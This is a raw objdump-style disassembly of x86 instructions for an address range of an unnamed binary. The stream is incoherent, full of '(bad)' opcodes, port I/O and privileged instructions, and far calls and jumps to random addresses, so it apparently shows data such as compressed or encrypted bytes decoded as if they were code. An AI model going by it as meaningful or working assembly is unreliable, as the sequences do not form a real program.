  412773:	inc    edx
  412774:	icebp  
  412775:	jle    0x412757
  412777:	or     ebp,DWORD PTR [ecx+0x7daec6bf]
  41277d:	jbe    0x412757
  41277f:	pop    ebp
  412780:	and    al,0x33
  412782:	mov    esp,0xfd8fcaad
  412787:	and    ah,BYTE PTR [ebx]
  412789:	(bad)  
  41278a:	fsub   st,st(6)
  41278c:	mov    bh,BYTE PTR [esp+ecx*8]
  41278f:	nop
  412790:	xchg   ebp,eax
  412791:	adc    al,0x98
  412793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412794:	push   ebp
  412795:	hlt    
  412796:	jmp    0xa6e5f917
  41279b:	pop    esp
  41279c:	ret    
  41279d:	adc    eax,DWORD PTR [esi]
  41279f:	div    DWORD PTR [esp+edx*4]
  4127a2:	dec    esi
  4127a3:	push   ds
  4127a4:	mov    bl,0x1
  4127a6:	repnz pop ebx
  4127a8:	xchg   ecx,eax
  4127a9:	and    BYTE PTR [ecx+eiz*8-0x66d60daf],cl
  4127b0:	mov    ebx,0x7436ab98
  4127b5:	adc    dh,BYTE PTR [ebx-0xc]
  4127b8:	xor    al,BYTE PTR [eax+edx*2-0x6d]
  4127bc:	das    
  4127bd:	xor    edx,ecx
  4127bf:	jmp    0x69f7a9ca
  4127c4:	pop    eax
  4127c5:	mov    ds:0xdf011d4c,eax
  4127ca:	aam    0xf1
  4127cc:	jo     0x4127c2
  4127ce:	lods   al,BYTE PTR ds:[esi]
  4127cf:	sbb    al,0x7
  4127d1:	test   BYTE PTR [esi-0x37],cl
  4127d4:	or     BYTE PTR [edx+edx*8-0x66],al
  4127d8:	test   DWORD PTR [edx-0x1974ddf9],edx
  4127de:	mov    dl,0x9d
  4127e0:	lahf   
  4127e1:	add    eax,0xc46719f
  4127e6:	dec    esi
  4127e7:	enter  0x2e64,0x30
  4127eb:	push   es
  4127ec:	mov    ebp,0xd9272f3
  4127f1:	popa   
  4127f2:	push   edi
  4127f3:	fucomip st,st(3)
  4127f5:	fcom   QWORD PTR [ebx-0x411f5937]
  4127fb:	das    
  4127fc:	add    eax,0xb23d868f
  412801:	test   DWORD PTR [ebx-0x496be253],ecx
  412807:	rcr    DWORD PTR [eax+0x2b],1
  41280a:	loop   0x4127ac
  41280c:	(bad)  
  41280d:	push   ds
  41280e:	sub    al,0x12
  412810:	xlat   BYTE PTR ds:[ebx]
  412811:	xchg   BYTE PTR [ecx-0x60],bh
  412814:	mov    BYTE PTR [edi],al
  412816:	mov    dh,0xd7
  412818:	mov    ecx,0x457c8de6
  41281d:	xchg   edx,eax
  41281e:	or     eax,0x42444539
  412823:	hlt    
  412824:	xchg   esi,eax
  412825:	cmp    DWORD PTR [ebp-0x3d],edx
  412828:	call   0x8066:0x238083af
  41282f:	in     eax,0x91
  412831:	out    0xa3,al
  412833:	rol    BYTE PTR [ebx],1
  412835:	js     0x41282a
  412837:	outs   dx,BYTE PTR ds:[esi]
  412838:	inc    ebp
  412839:	ins    DWORD PTR es:[edi],dx
  41283a:	sbb    DWORD PTR [edx],0xfffffff7
  41283d:	or     ebx,DWORD PTR [edx]
  41283f:	mov    cl,ch
  412841:	test   DWORD PTR [ecx+eiz*4-0x41],ebx
  412845:	std    
  412846:	inc    edx
  412847:	xchg   esi,eax
  412848:	push   ebx
  412849:	loop   0x4128b7
  41284b:	dec    esi
  41284c:	and    esi,DWORD PTR [edi]
  41284e:	mov    ebp,0x6e8ce174
  412853:	popa   
  412854:	cli    
  412855:	sbb    ch,BYTE PTR [ecx]
  412857:	repz xor al,dh
  41285a:	addr16 in eax,dx
  41285c:	das    
  41285d:	dec    edx
  41285e:	push   cs
  41285f:	test   BYTE PTR [esi-0x72],bh
  412862:	dec    edx
  412863:	bound  esp,QWORD PTR [edi-0x3fb3c910]
  412869:	out    dx,al
  41286a:	ja     0x41283f
  41286c:	jb     0x412896
  41286e:	and    BYTE PTR [edx+0x4],ch
  412871:	call   0x4edd:0xba82034d
  412878:	fnsave ds:0xb846a1e
  41287e:	pop    esi
  41287f:	mov    dl,0x7e
  412881:	div    BYTE PTR [eax]
  412883:	cmc    
  412884:	pop    esi
  412885:	cmp    BYTE PTR [esi-0x7ce96786],bl
  41288b:	(bad)  
  41288c:	sbb    eax,0x5906306e
  412891:	popa   
  412892:	add    ebp,edx
  412894:	sbb    al,0x3c
  412896:	dec    ebx
  412897:	idiv   cl
  412899:	sub    eax,0xe29d62f3
  41289e:	outs   dx,DWORD PTR ds:[esi]
  41289f:	arpl   cx,bp
  4128a1:	icebp  
  4128a2:	xchg   DWORD PTR [eax-0x16],edx
  4128a5:	pop    ebx
  4128a6:	pop    es
  4128a7:	fiadd  WORD PTR [edi+0x31]
  4128aa:	cli    
  4128ab:	mov    ebp,DWORD PTR [edi]
  4128ad:	jns    0x4128ea
  4128af:	mov    edx,DWORD PTR [ecx]
  4128b1:	mov    bh,0x2e
  4128b3:	or     BYTE PTR [eax+0x6],bl
  4128b6:	xchg   edi,eax
  4128b7:	adc    al,0x14
  4128b9:	jne    0x412906
  4128bb:	mov    DWORD PTR [bp+si],esi
  4128be:	adc    ch,BYTE PTR [edx+0x7]
  4128c1:	xchg   BYTE PTR [eax-0x7d],ch
  4128c4:	lahf   
  4128c5:	pushf  
  4128c6:	push   esi
  4128c7:	cmp    dl,0x55
  4128ca:	lods   al,BYTE PTR ds:[esi]
  4128cb:	jne    0x412918
  4128cd:	pushf  
  4128ce:	fld    TBYTE PTR [edx-0x3b]
  4128d1:	cmp    ecx,DWORD PTR [esi+0x1a151760]
  4128d7:	jbe    0x41290a
  4128d9:	cmp    bl,ah
  4128db:	sub    BYTE PTR [edx+esi*1+0x661fb74d],dh
  4128e2:	in     eax,dx
  4128e3:	in     eax,0x99
  4128e5:	popf   
  4128e6:	sbb    al,0xdf
  4128e8:	ds push ds
  4128ea:	jns    0x3d9de7c8
  4128f0:	dec    edi
  4128f1:	cwde   
  4128f2:	adc    edx,eax
  4128f4:	and    ch,BYTE PTR [ebx-0xfbf30b9]
  4128fa:	mov    bl,0x2a
  4128fc:	adc    BYTE PTR ds:0x17299254,bl
  412902:	xchg   esi,eax
  412903:	xor    dh,BYTE PTR [esi-0x5f]
  412906:	test   al,0x63
  412908:	push   ds
  412909:	lds    edx,FWORD PTR [ecx+0x4b]
  41290c:	js     0x4128cb
  41290e:	sar    BYTE PTR [edi],0x46
  412911:	not    DWORD PTR [esi+esi*4]
  412914:	scas   eax,DWORD PTR es:[edi]
  412915:	test   BYTE PTR [ebp-0x62],ah
  412918:	mov    ebx,0x132687d9
  41291d:	xor    DWORD PTR [edi-0x6a],esp
  412920:	push   ecx
  412921:	pop    edi
  412922:	or     al,0xb6
  412924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412925:	jle    0x41292b
  412927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412928:	out    dx,eax
  412929:	push   ebp
  41292a:	or     al,0xb
  41292c:	cmp    eax,DWORD PTR [esp+ebp*1]
  41292f:	inc    edi
  412930:	aas    
  412931:	mov    dh,0x85
  412933:	sbb    edi,DWORD PTR [ecx+0x8a26a8]
  412939:	out    dx,al
  41293a:	scas   eax,DWORD PTR es:[edi]
  41293b:	mov    ebx,0x7e671373
  412940:	inc    edx
  412941:	shr    BYTE PTR [ebx-0x7d46cae9],0xfc
  412948:	test   eax,0x5c49e6ab
  41294d:	mov    al,ds:0x90d3c104
  412952:	pop    es
  412953:	jl     0x41296b
  412955:	xor    BYTE PTR [ebx],dh
  412957:	(bad)  
  412958:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412959:	icebp  
  41295a:	imul   esi,DWORD PTR [ebx+0x757b3c9c],0xffffff97
  412961:	adc    al,dh
  412963:	das    
  412964:	inc    ebx
  412965:	add    cl,BYTE PTR [ebp-0x2]
  412968:	mov    al,BYTE PTR [eax+0x4cdf862c]
  41296e:	ja     0x412989
  412970:	xor    eax,0xc6360c12
  412975:	out    dx,al
  412976:	jp     0x4129f7
  412978:	push   0x1a
  41297a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41297b:	or     eax,0xc674b9b7
  412980:	cld    
  412981:	push   cs
  412982:	cwde   
  412983:	xor    al,0xf6
  412985:	inc    edi
  412986:	inc    eax
  412987:	xor    BYTE PTR [edx*4+0x247151f],dl
  41298e:	pop    edi
  41298f:	jbe    0x412984
  412991:	push   esp
  412992:	jecxz  0x412a07
  412994:	ds sub ebp,edx
  412997:	iret   
  412998:	in     eax,dx
  412999:	xchg   esi,eax
  41299a:	lods   eax,DWORD PTR ds:[esi]
  41299b:	into   
  41299c:	jns    0x41293a
  41299e:	dec    ebp
  41299f:	call   0x590f:0xf43aa026
  4129a6:	adc    eax,0xb06eda48
  4129ab:	add    al,0x47
  4129ad:	cmp    al,0x69
  4129af:	mov    dh,0x23
  4129b1:	loope  0x412a2f
  4129b3:	sbb    dh,BYTE PTR [ebx]
  4129b5:	xor    ecx,DWORD PTR [ebx-0x6a5244a2]
  4129bb:	loopne 0x412988
  4129bd:	ret    
  4129be:	mov    al,ds:0xf1b535ea
  4129c3:	outs   dx,BYTE PTR ds:[esi]
  4129c4:	sbb    DWORD PTR [ebx],edx
  4129c6:	pop    edi
  4129c7:	mov    ds:0x8c738a43,al
  4129cc:	(bad)  
  4129cd:	jno    0x412962
  4129cf:	mov    ds:0xf200817d,al
  4129d4:	mov    dh,0xd2
  4129d6:	inc    ebp
  4129d7:	xor    DWORD PTR [esi],ecx
  4129d9:	add    dh,BYTE PTR [ecx-0x23cead6e]
  4129df:	stos   DWORD PTR es:[edi],eax
  4129e0:	push   ebp
  4129e1:	in     eax,0x4c
  4129e3:	sub    esp,eax
  4129e5:	out    0x46,eax
  4129e7:	push   ds
  4129e8:	aam    0xa0
  4129ea:	out    0x91,al
  4129ec:	xchg   BYTE PTR [edx+0x157557f],dl
  4129f2:	imul   edi,DWORD PTR [edi+ebp*2+0x14bb4e9e],0x6c
  4129fa:	inc    dx
  4129fc:	out    dx,al
  4129fd:	push   cs
  4129fe:	stc    
  4129ff:	dec    ebp
  412a00:	dec    ecx
  412a01:	fwait
  412a02:	push   0x86f625f9
  412a07:	lea    edx,[bx+si]
  412a0a:	mov    al,ds:0x708eab16
  412a0f:	xchg   ebx,eax
  412a10:	mov    bh,0xca
  412a12:	(bad)  
  412a14:	inc    ecx
  412a15:	cmp    dh,al
  412a17:	jge    0x4129e7
  412a19:	inc    esi
  412a1a:	or     dl,BYTE PTR [eax-0xa6ffebc]
  412a20:	ret    
  412a21:	jp     0x412a7f
  412a23:	push   ds
  412a24:	imul   eax,DWORD PTR [esi-0x3c],0x56
  412a28:	mov    dh,0x31
  412a2a:	jae    0x412a39
  412a2c:	add    eax,0x520f543d
  412a31:	fistp  DWORD PTR [edx]
  412a33:	cwde   
  412a34:	add    edi,DWORD PTR [eax+0x203ee32b]
  412a3a:	or     al,BYTE PTR [eax+0x4109d875]
  412a40:	sub    ecx,esi
  412a42:	ror    BYTE PTR [ecx+0x42],0xa0
  412a46:	out    0x9b,eax
  412a48:	and    DWORD PTR [edi+0x1f74564d],0xac5d6f53
  412a52:	mov    edx,0xb813c4ee
  412a57:	inc    esp
  412a58:	pop    ds
  412a59:	sub    dl,BYTE PTR ds:0x2ec20e0
  412a5f:	add    BYTE PTR [esi-0x1],al
  412a62:	inc    ecx
  412a63:	lahf   
  412a64:	test   BYTE PTR [ebx+0x71dfa33b],bl
  412a6a:	add    DWORD PTR [esi],0x41781814
  412a70:	xor    cl,bl
  412a72:	push   0xffffff95
  412a74:	mov    BYTE PTR [ecx-0x49],ch
  412a77:	xor    bl,BYTE PTR [edx]
  412a79:	cmp    ebp,DWORD PTR [eax+ecx*2+0x14e9e049]
  412a80:	pop    esp
  412a81:	pusha  
  412a82:	dec    DWORD PTR [eax+0x26]
  412a85:	sbb    bl,BYTE PTR [edx+0x477e99b1]
  412a8b:	push   edx
  412a8c:	pop    es
  412a8d:	lods   al,BYTE PTR ds:[esi]
  412a8e:	xchg   ebp,eax
  412a8f:	jne    0x412ac1
  412a91:	and    esi,DWORD PTR [eax]
  412a93:	and    dh,BYTE PTR [eax+esi*2]
  412a96:	push   ebp
  412a97:	popa   
  412a98:	add    BYTE PTR [esi-0x4e],bl
  412a9b:	aad    0x77
  412a9d:	mov    bh,BYTE PTR [edi-0x5a]
  412aa0:	ds mov ch,0x91
  412aa3:	pop    eax
  412aa4:	nop
  412aa5:	adc    BYTE PTR [esi+0x3a32124f],ah
  412aab:	push   cs
  412aac:	and    eax,DWORD PTR [esp+ebp*8-0x5beb0200]
  412ab3:	call   0xc0daf571
  412ab8:	mov    WORD PTR [edi-0x46],es
  412abb:	stos   BYTE PTR es:[edi],al
  412abc:	fcom   QWORD PTR [ebp-0x48]
  412abf:	(bad)  
  412ac0:	xchg   edx,eax
  412ac1:	inc    edi
  412ac2:	es fcmovnu st,st(5)
  412ac5:	cdq    
  412ac6:	and    esi,DWORD PTR [eax-0xf]
  412ac9:	test   DWORD PTR [ebx+0x3f9cffdb],ebp
  412acf:	(bad)  
  412ad0:	iret   
  412ad1:	sub    DWORD PTR [ecx],ecx
  412ad3:	call   0x4492:0xe92cdf09
  412ada:	daa    
  412adb:	sbb    eax,0x8a9d3328
  412ae0:	jmp    0x75e857fd
  412ae5:	aad    0x1c
  412ae7:	adc    BYTE PTR [ecx],al
  412ae9:	push   ebp
  412aea:	daa    
  412aeb:	and    edi,DWORD PTR [edx-0x2a]
  412aee:	or     DWORD PTR [esi+0x600cd649],edx
  412af4:	sub    ah,BYTE PTR [eax+0x2b]
  412af7:	ret    
  412af8:	test   DWORD PTR [edx],ebx
  412afa:	pop    es
  412afb:	xchg   edx,eax
  412afc:	fs push ebx
  412afe:	pop    esp
  412aff:	xor    edx,eax
  412b01:	out    dx,eax
  412b02:	sti    
  412b03:	cmp    al,BYTE PTR [ecx]
  412b05:	bound  edx,QWORD PTR [ebx]
  412b07:	mov    al,bh
  412b09:	sbb    eax,0xde8843dd
  412b0e:	loop   0x412b8e
  412b10:	test   eax,0xe6d918c5
  412b15:	shl    bh,1
  412b17:	fsub   QWORD PTR [ebx+0x206a7c35]
  412b1d:	xchg   esi,eax
  412b1e:	sub    ebx,DWORD PTR [esp+esi*1-0x649ec68f]
  412b25:	xchg   esp,eax
  412b26:	mov    eax,0xcdcdcf26
  412b2b:	cmp    eax,0x3c0c4c15
  412b30:	adc    edi,edx
  412b32:	loop   0x412b8d
  412b34:	mov    esp,DWORD PTR [esi]
  412b36:	leave  
  412b37:	inc    esi
  412b38:	fadd   QWORD PTR [edi-0x7b]
  412b3b:	jbe    0x412b90
  412b3d:	out    0x88,al
  412b3f:	inc    esi
  412b40:	pcmpgtb mm3,QWORD PTR [eax-0x70]
  412b44:	repz mov edi,0x2eef41f
  412b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b4b:	bound  esi,QWORD PTR [ecx]
  412b4d:	(bad)  
  412b4e:	mov    ah,BYTE PTR ds:0x4bbae635
  412b54:	in     al,dx
  412b55:	adc    DWORD PTR ds:0x1b488c9d,ebp
  412b5b:	mov    esp,eax
  412b5d:	loopne 0x412b95
  412b5f:	pop    eax
  412b60:	sbb    eax,0xfe6cda39
  412b65:	or     eax,0xd4e12e0
  412b6a:	add    al,ch
  412b6c:	or     edi,DWORD PTR [edx+0x5d]
  412b6f:	(bad)  
  412b70:	and    al,BYTE PTR [ecx+0x3e9d572c]
  412b76:	jne    0x412b00
  412b78:	aad    0x47
  412b7a:	nop
  412b7b:	ins    DWORD PTR es:[edi],dx
  412b7c:	in     eax,0x1b
  412b7e:	iret   
  412b7f:	jbe    0x412b14
  412b81:	or     DWORD PTR [ebx+0x568a27c7],ecx
  412b87:	lea    edi,[edi+0x37]
  412b8a:	test   DWORD PTR [eax],ecx
  412b8c:	mov    WORD PTR [eax-0x554acf55],?
  412b92:	div    BYTE PTR [esi]
  412b94:	push   esi
  412b95:	xlat   BYTE PTR ds:[ebx]
  412b96:	retf   0x19ed
  412b99:	fist   WORD PTR [ecx+0x1c5ad478]
  412b9f:	dec    ebp
  412ba0:	(bad)  
  412ba1:	cmp    esp,ecx
  412ba3:	xor    eax,esp
  412ba5:	sbb    ebp,ebx
  412ba7:	mov    ds:0xc72605a5,eax
  412bac:	or     al,0x76
  412bae:	push   eax
  412baf:	ret    0x782c
  412bb2:	sub    BYTE PTR [edi+0x77],bl
  412bb5:	xor    esi,DWORD PTR [eax]
  412bb7:	sbb    al,dh
  412bb9:	loopne 0x412bb5
  412bbb:	cmp    DWORD PTR [esi+0x44],edx
  412bbe:	cli    
  412bbf:	cli    
  412bc0:	xor    ebx,DWORD PTR cs:[ecx+esi*8+0x23]
  412bc5:	fcomp  QWORD PTR [ebx+0x24]
  412bc8:	ins    BYTE PTR es:[edi],dx
  412bc9:	mov    al,0xa0
  412bcb:	jmp    0xded3bf5
  412bd0:	out    dx,al
  412bd1:	sar    DWORD PTR [edi],1
  412bd3:	pop    eax
  412bd4:	mov    ecx,0x4a566ae3
  412bd9:	(bad)  
  412bda:	inc    esi
  412bdb:	sbb    DWORD PTR [ebx-0x29],ebx
  412bde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bdf:	mov    edx,0x5224b2e3
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	and    al,0xec
  412be7:	aad    0x2d
  412be9:	rcl    eax,cl
  412beb:	int    0x54
  412bed:	jae    0x412c6c
  412bef:	push   ss
  412bf0:	lahf   
  412bf1:	mov    cl,0x1d
  412bf3:	dec    esi
  412bf4:	pop    esp
  412bf5:	sub    dh,BYTE PTR [esi+0x35]
  412bf8:	mov    dl,0x68
  412bfa:	pusha  
  412bfb:	push   edi
  412bfc:	cmc    
  412bfd:	mov    DWORD PTR [ecx+0x17443b28],edx
  412c03:	push   ecx
  412c04:	sub    al,0x56
  412c06:	xor    DWORD PTR [edi-0x15],edi
  412c09:	(bad)  
  412c0a:	sar    ebx,1
  412c0c:	mov    eax,ds:0x147c22d6
  412c11:	(bad)  
  412c12:	and    eax,0xd6728c90
  412c17:	sub    ebx,DWORD PTR [ebp+0x7b]
  412c1a:	or     edx,ebx
  412c1c:	sub    edx,edi
  412c1e:	sub    BYTE PTR [ecx+0x7d],0xf3
  412c22:	jne    0x412c4f
  412c24:	ds sub edi,esi
  412c27:	push   es
  412c28:	out    dx,al
  412c29:	dec    esi
  412c2a:	(bad)  [eax-0x5ec16143]
  412c30:	in     eax,dx
  412c31:	cs jle 0x412bf6
  412c34:	rcr    BYTE PTR [ecx],0xf5
  412c37:	test   edi,eax
  412c39:	jg     0x412cb5
  412c3b:	lock lds ebp,FWORD PTR [eax-0x6f902ba0]
  412c42:	in     eax,dx
  412c43:	aaa    
  412c44:	mov    ds:0x86a15d1f,eax
  412c49:	div    BYTE PTR [esi+0x32]
  412c4c:	pop    edi
  412c4d:	dec    esp
  412c4e:	push   edx
  412c4f:	push   ds
  412c50:	imul   esp,DWORD PTR [esi],0xd
  412c53:	jmp    0x412bf8
  412c55:	sub    cl,0x6b
  412c58:	cmp    dh,BYTE PTR [eax+0x55]
  412c5b:	adc    esi,eax
  412c5d:	pop    ss
  412c5e:	sbb    edi,DWORD PTR [edx+0x6e4f1133]
  412c64:	aad    0x8e
  412c66:	std    
  412c67:	dec    edx
  412c68:	jae    0x412bfa
  412c6a:	xchg   ecx,eax
  412c6b:	fnstcw WORD PTR [ebp+0x10]
  412c6e:	pop    edx
  412c6f:	jbe    0x412c27
  412c71:	cmp    BYTE PTR [edi+0x7d],cl
  412c74:	jae    0x412bf8
  412c76:	add    ebp,edx
  412c78:	mov    ch,0x39
  412c7a:	gs out dx,eax
  412c7c:	scas   al,BYTE PTR es:[edi]
  412c7d:	psubusw mm2,QWORD PTR [esi-0x5f]
  412c81:	(bad)  
  412c82:	call   0xd8cb1022
  412c87:	push   edx
  412c88:	and    al,BYTE PTR [edx]
  412c8a:	fistp  DWORD PTR [ebx-0x557ea0d5]
  412c90:	dec    edi
  412c91:	xor    esp,ebp
  412c93:	ret    
  412c94:	sar    DWORD PTR ds:0x124e81e2,cl
  412c9a:	dec    ebp
  412c9b:	inc    ebx
  412c9c:	inc    edx
  412c9d:	pop    eax
  412c9e:	adc    BYTE PTR [edx],ah
  412ca0:	ja     0x412c7a
  412ca2:	mov    ecx,0x2291546a
  412ca7:	add    eax,0x20c827d3
  412cac:	dec    ebp
  412cad:	pop    ebp
  412cae:	pusha  
  412caf:	lods   al,BYTE PTR ds:[esi]
  412cb0:	cld    
  412cb1:	scas   eax,DWORD PTR es:[edi]
  412cb2:	dec    eax
  412cb3:	aad    0xd7
  412cb5:	(bad)  
  412cb7:	mov    esp,0xb59d44dc
  412cbc:	push   edx
  412cbd:	or     al,0x49
  412cbf:	push   0xac1fb94
  412cc4:	mov    ds:0xaa4d6f44,al
  412cc9:	int3   
  412cca:	sbb    BYTE PTR [edi-0x6cb63914],0x41
  412cd1:	popf   
  412cd2:	fld    TBYTE PTR [edi-0x2b]
  412cd5:	mov    eax,ds:0xe225cd50
  412cda:	push   eax
  412cdb:	pop    ds
  412cdc:	shl    eax,1
  412cde:	popa   
  412cdf:	call   0x8c1b:0xe678cd56
  412ce6:	pop    ss
  412ce7:	and    BYTE PTR [eax-0x7065ac99],ch
  412ced:	ja     0x412d4c
  412cef:	mov    esp,0x18501b92
  412cf4:	push   0x90e0c6c8
  412cf9:	idiv   BYTE PTR [eax+0x59f57864]
  412cff:	mov    ecx,0xc09aebd6
  412d04:	fcomp  DWORD PTR [ebx+0x4d]
  412d07:	es es out dx,al
  412d0a:	pop    eax
  412d0b:	sti    
  412d0c:	rcl    esp,1
  412d0e:	fist   WORD PTR [eax+0x3af30318]
  412d14:	pop    eax
  412d15:	nop
  412d16:	loope  0x412cbd
  412d18:	loopne 0x412d2a
  412d1a:	pop    es
  412d1b:	xchg   BYTE PTR [eax-0x131257f7],bl
  412d21:	adc    al,0x6d
  412d23:	fnstsw WORD PTR [eax-0x7384fe32]
  412d29:	ficom  DWORD PTR [ecx+esi*4-0x5e]
  412d2d:	sub    ebp,0xffffff93
  412d30:	out    0xad,eax
  412d32:	inc    edi
  412d33:	ds inc esp
  412d35:	mov    esp,esp
  412d37:	fadd   QWORD PTR [edi-0x66]
  412d3a:	push   esi
  412d3b:	pop    ecx
  412d3c:	dec    eax
  412d3d:	(bad)  
  412d3e:	pop    edx
  412d3f:	adc    ebx,eax
  412d41:	pop    ds
  412d42:	ja     0x412d1c
  412d44:	sbb    DWORD PTR [esi+ecx*8+0x4ddf9fa9],edi
  412d4b:	adc    BYTE PTR [ecx+0x1],0x4d
  412d4f:	dec    ebx
  412d50:	(bad)  
  412d52:	sbb    cl,BYTE PTR [ebx]
  412d54:	ins    DWORD PTR es:[edi],dx
  412d55:	das    
  412d56:	pop    ecx
  412d57:	push   ecx
  412d58:	aaa    
  412d59:	mov    dh,0x96
  412d5b:	mov    ch,0xe5
  412d5d:	int3   
  412d5e:	xchg   esp,eax
  412d5f:	push   es
  412d60:	mov    ds:0x660892c4,eax
  412d65:	arpl   WORD PTR [ebx],di
  412d67:	or     eax,0xc1d51b7
  412d6c:	adc    eax,0x53c2097e
  412d71:	pop    ebx
  412d72:	pop    esp
  412d73:	sbb    edx,esi
  412d75:	cwde   
  412d76:	and    bh,BYTE PTR [edx]
  412d78:	adc    DWORD PTR [esi-0xd],esp
  412d7b:	mov    ah,0xfd
  412d7d:	add    al,0xb8
  412d7f:	in     al,dx
  412d80:	mov    al,ds:0x78299981
  412d85:	fsub   QWORD PTR [edi*8-0x36996f4a]
  412d8c:	call   0x6bc0:0xa396489c
  412d93:	repz mov ch,0xd5
  412d96:	lods   eax,DWORD PTR ds:[esi]
  412d97:	jg     0x412e0c
  412d99:	inc    esp
  412d9a:	adc    BYTE PTR ds:0x256ff60c,0x8d
  412da1:	xor    DWORD PTR [ebx+ecx*4],ebp
  412da4:	cs mov ecx,0x7da0dac6
  412daa:	push   ebx
  412dab:	pushf  
  412dac:	test   al,bl
  412dae:	adc    ch,BYTE PTR [ecx-0x4b]
  412db1:	leave  
  412db2:	pusha  
  412db3:	pushf  
  412db4:	shl    BYTE PTR [edx-0x72],cl
  412db7:	adc    al,0x37
  412db9:	cmp    al,0xde
  412dbb:	add    al,BYTE PTR [ebx+ebp*1+0x7]
  412dbf:	xor    DWORD PTR [ecx],edi
  412dc1:	(bad)  
  412dc2:	pop    ebp
  412dc3:	es mov ah,0x7b
  412dc6:	push   cs
  412dc7:	(bad)  
  412dc8:	aam    0x11
  412dca:	sar    edi,cl
  412dcc:	xchg   ebp,eax
  412dcd:	jnp    0x412e3a
  412dcf:	dec    ebp
  412dd0:	push   esi
  412dd1:	shl    dh,0x5a
  412dd4:	push   es
  412dd5:	sub    DWORD PTR [eax+0x5c],0x853fdac8
  412ddc:	into   
  412ddd:	xchg   DWORD PTR [edx-0x71cafda0],ebx
  412de3:	stc    
  412de4:	pop    ebx
  412de5:	jmp    0x2dacbbd1
  412dea:	push   ecx
  412deb:	push   0x21065a5b
  412df0:	fstp   DWORD PTR [esi-0x15aed6f3]
  412df6:	in     al,dx
  412df7:	sbb    BYTE PTR es:[edx-0x2f],al
  412dfb:	dec    edi
  412dfc:	pop    es
  412dfd:	jp     0x412e7a
  412dff:	mov    ecx,0x9340fc44
  412e04:	jne    0x412daa
  412e06:	and    ecx,esp
  412e08:	adc    ah,ah
  412e0a:	cmp    DWORD PTR [ecx-0x631b6a5a],eax
  412e10:	dec    ebx
  412e11:	dec    ebx
  412e12:	add    BYTE PTR [edx-0x1debf559],ah
  412e18:	mov    dl,0xe7
  412e1a:	jmp    0x2d9cb0fa
  412e1f:	xchg   ebp,eax
  412e20:	xchg   ebx,eax
  412e21:	cmp    DWORD PTR [edi+esi*1-0x1a7c1249],edx
  412e28:	jno    0x412e39
  412e2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e2b:	xor    dh,BYTE PTR [esi-0x7aae745]
  412e31:	mov    dl,0x8a
  412e33:	(bad)  
  412e34:	push   ds
  412e35:	xchg   edi,eax
  412e36:	jg     0x412e19
  412e38:	push   esi
  412e39:	mov    esp,0x432991a5
  412e3e:	pop    esi
  412e3f:	btc    DWORD PTR [eax],edx
  412e42:	repz test al,0x39
  412e45:	push   ebx
  412e46:	cwde   
  412e47:	cld    
  412e48:	pushf  
  412e49:	pop    esi
  412e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e4b:	pushf  
  412e4c:	pop    edi
  412e4d:	pop    edi
  412e4e:	jl     0x412e1f
  412e50:	and    eax,0x1d7ada44
  412e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e56:	dec    esi
  412e57:	push   0xfffffff0
  412e59:	enter  0x597a,0x43
  412e5d:	sbb    dh,ah
  412e5f:	mov    ds:0x5120a86b,al
  412e64:	jmp    edx
  412e66:	dec    edx
  412e67:	jnp    0x412e67
  412e69:	arpl   WORD PTR [esp+ebp*4],di
  412e6c:	inc    esi
  412e6d:	push   eax
  412e6e:	sub    DWORD PTR [edx-0x69],ebx
  412e71:	fyl2x  
  412e73:	cmp    al,0x4
  412e75:	xor    BYTE PTR [edx-0x2a5f18d6],dh
  412e7b:	fwait
  412e7c:	jmp    0xaefb2092
  412e81:	dec    edi
  412e82:	sbb    al,0xbe
  412e84:	test   eax,0x7ddfa0f5
  412e89:	aam    0xa6
  412e8b:	in     al,dx
  412e8c:	mov    esp,ebx
  412e8e:	inc    esp
  412e8f:	cld    
  412e90:	dec    ebp
  412e91:	dec    edx
  412e92:	mov    edx,0xcbee90a2
  412e97:	ja     0x412e2f
  412e99:	(bad)  
  412e9a:	hlt    
  412e9b:	retf   
  412e9c:	mov    ecx,DWORD PTR [ecx]
  412e9e:	xchg   edi,eax
  412e9f:	stos   BYTE PTR es:[edi],al
  412ea0:	cwde   
  412ea1:	aam    0x92
  412ea3:	inc    esi
  412ea4:	pop    ebx
  412ea5:	jae    0x412ec1
  412ea7:	(bad)  
  412ea9:	and    cl,dl
  412eab:	(bad)  
  412eac:	and    DWORD PTR [esi-0x5],0x26
  412eb0:	(bad)  [esi+0x28]
  412eb3:	pop    edx
  412eb4:	sbb    DWORD PTR [ebx-0x24],esi
  412eb7:	(bad)  
  412eb8:	jo     0x412eaa
  412eba:	test   BYTE PTR [ecx+edx*2],al
  412ebd:	fdivr  DWORD PTR es:[esi-0x72]
  412ec1:	iret   
  412ec2:	push   eax
  412ec3:	add    bh,BYTE PTR [ebx+esi*4]
  412ec6:	shl    al,1
  412ec8:	mov    eax,ds:0xd8b8632
  412ecd:	loopne 0x412e62
  412ecf:	in     al,0x35
  412ed1:	rcl    BYTE PTR [ebx],1
  412ed3:	and    ah,BYTE PTR [ecx]
  412ed5:	popf   
  412ed6:	imul   edi,DWORD PTR [ebp+0x59f706d1],0x45c64c34
  412ee0:	mov    bl,0xc0
  412ee2:	dec    ecx
  412ee3:	cdq    
  412ee4:	comiss xmm5,DWORD PTR [esi]
  412ee7:	mov    bh,0x4c
  412ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eea:	int3   
  412eeb:	fidiv  DWORD PTR [ecx+0x1e]
  412eee:	push   ecx
  412eef:	in     eax,0x88
  412ef1:	out    0x3f,eax
  412ef3:	jno    0x412f0f
  412ef5:	push   edi
  412ef6:	add    eax,0x30f229de
  412efb:	scas   al,BYTE PTR es:[edi]
  412efc:	test   bh,bh
  412efe:	test   BYTE PTR ds:0x58a46377,dl
  412f04:	xchg   ecx,eax
  412f05:	sti    
  412f06:	xor    al,0x1b
  412f08:	ret    0x828a
  412f0b:	jns    0x412eb7
  412f0d:	jle    0x412f71
